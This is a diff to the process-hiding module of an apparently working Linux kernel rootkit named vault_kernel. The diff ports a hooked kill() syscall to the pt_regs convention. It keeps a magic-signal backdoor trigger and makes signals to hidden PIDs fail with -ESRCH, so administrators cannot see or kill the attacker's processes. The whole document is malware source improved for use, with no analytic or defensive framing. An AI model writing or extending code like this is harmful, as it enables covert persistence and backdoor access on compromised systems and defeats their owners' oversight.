@@ -1,6 +1,8 @@
 /* vault_kernel - proc_hide.c
  * Process hiding — PIDs are hidden from /proc enumeration
- * Also hooks kill() to intercept signals to hidden processes
+ * Also hooks kill() to intercept signals for the backdoor and to
+ * protect hidden processes (signals to a hidden PID fail with
+ * -ESRCH, exactly as if the process did not exist).
  * ruby570bocadito © 2026
  */
 #include "core.h"
@@ -74,15 +76,24 @@ int is_proc_pid_hidden(const char *d_name) {
  * Hooked kill() — intercept magic signals for backdoor + protect
  * hidden processes from external signals
  * ================================================================ */
-asmlinkage long hooked_kill(pid_t pid, int sig) {
-    long (*orig_kill)(pid_t, int);
+asmlinkage long hooked_kill(const struct pt_regs *regs) {
+    long (*orig_kill)(const struct pt_regs *);
+    pid_t pid = (pid_t)regs->di;
+    int sig = (int)regs->si;
+
     orig_kill = (void *)hooks[HOOKIDX_KILL].original;
 
     /* Check for magic packet backdoor trigger (see backdoor.c) */
     if (backdoor_check_magic(pid, sig))
         return 0;
 
-    return orig_kill(pid, sig);
+    /* A hidden process does not exist: signal() → -ESRCH.
+     * Only exact positive PIDs are filtered so that broadcasts
+     * (pid < 0) and process-group signals (pid == 0) pass. */
+    if (pid > 0 && is_pid_hidden(pid))
+        return -ESRCH;
+
+    return orig_kill(regs);
 }
 
 int proc_hide_init(void) {
